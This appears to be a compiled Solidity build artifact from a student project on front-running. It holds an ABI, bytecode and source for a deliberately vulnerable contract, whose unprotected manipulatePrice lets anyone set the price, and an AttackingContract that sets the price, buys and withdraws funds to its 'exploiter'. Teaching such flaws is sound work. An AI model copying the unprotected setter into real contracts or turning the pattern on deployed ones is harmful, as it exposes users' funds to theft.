{
  "contractName": "FrontRunningContract",
  "abi": [
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "newPrice",
          "type": "uint256"
        }
      ],
      "name": "PriceManipulated",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "address",
          "name": "buyer",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "Purchase",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "manipulatedPrice",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_price",
          "type": "uint256"
        }
      ],
      "name": "manipulatePrice",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "purchase",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50610332806100206000396000f3fe6080604052600436106100345760003560e01c806359b118b01461003957806364edfbf014610062578063f52d12da1461006c575b600080fd5b34801561004557600080fd5b50610060600480360381019061005b9190610198565b610097565b005b61006a6100d8565b005b34801561007857600080fd5b50610081610157565b60405161008e91906101d4565b60405180910390f35b806000819055507f78c588fd653f3b8747ab2e2807c80f776080e114d98bd946ce9b2804887c395e816040516100cd91906101d4565b60405180910390a150565b600054341461011c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161011390610272565b60405180910390fd5b7f2499a5330ab0979cc612135e7883ebc3cd5c9f7a8508f042540c34723348f632333460405161014d9291906102d3565b60405180910390a1565b60005481565b600080fd5b6000819050919050565b61017581610162565b811461018057600080fd5b50565b6000813590506101928161016c565b92915050565b6000602082840312156101ae576101ad61015d565b5b60006101bc84828501610183565b91505092915050565b6101ce81610162565b82525050565b60006020820190506101e960008301846101c5565b92915050565b600082825260208201905092915050565b7f4d7573742073656e642065786163746c7920746865206d616e6970756c61746560008201527f6420707269636500000000000000000000000000000000000000000000000000602082015250565b600061025c6027836101ef565b915061026782610200565b604082019050919050565b6000602082019050818103600083015261028b8161024f565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006102bd82610292565b9050919050565b6102cd816102b2565b82525050565b60006040820190506102e860008301856102c4565b6102f560208301846101c5565b939250505056fea264697066735822122068249285dc3b5685ea151aff6c50b8722a1955c81c3f9d8ce09422523baa469364736f6c63430008130033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: UNLICENSED\r\npragma solidity ^0.8.19;\r\n\r\ncontract FrontRunningContract {\r\n\r\n uint256 public manipulatedPrice;\r\n    event PriceManipulated(uint256 newPrice); //event triggered upon price manipulation\r\n    event Purchase(address buyer, uint256 amount); //event triggered after a purchase\r\n    function manipulatePrice(uint256 _price) external {\r\n        manipulatedPrice = _price; //update current price with manipulated\r\n        emit PriceManipulated(_price); //emit manipulated price\r\n    }\r\n\r\n    function purchase() external payable {\r\n        require(msg.value == manipulatedPrice, \"Must send exactly the manipulated price\");\r\n    emit Purchase(msg.sender, msg.value); //emit purchaser address and amount\r\n    }\r\n}\r\n\r\ncontract AttackingContract {\r\n    \r\nFrontRunningContract public frontRunningContract;\r\n    address public exploiter;\r\n    event Exploitation(uint256 priceSent); //triggered if exploit detected\r\n\r\n    constructor(address _priceManipulationContract) {\r\n        frontRunningContract = FrontRunningContract(_priceManipulationContract); //Initialising the vulnerable contract variable with corresponding address\r\n        exploiter = msg.sender; //set exploiter as contract owner\r\n    }\r\n\r\n    function exploit(uint256 _price) external payable { //payable to take Ether\r\n        emit Exploitation(_price); //emit exploitation with price provided \r\n        frontRunningContract.manipulatePrice(_price + 1); //price manipulation\r\n        frontRunningContract.purchase{value: _price + 1}(); //purchase with manipulated price\r\n    }\r\n\r\n    function withdraw() external {\r\n        require(msg.sender == exploiter, \"Only the exploiter can withdraw\");\r\n        payable(exploiter).transfer(address(this).balance); //transfer contract balance to attacker\r\n    }\r\n}",
  "sourcePath": "C:\\Users\\joshu\\OneDrive\\Desktop\\Individual Project\\Smart Contracts\\contracts\\FrontRunning.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.19+commit.7dd6d404.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-04-22T17:37:36.498Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}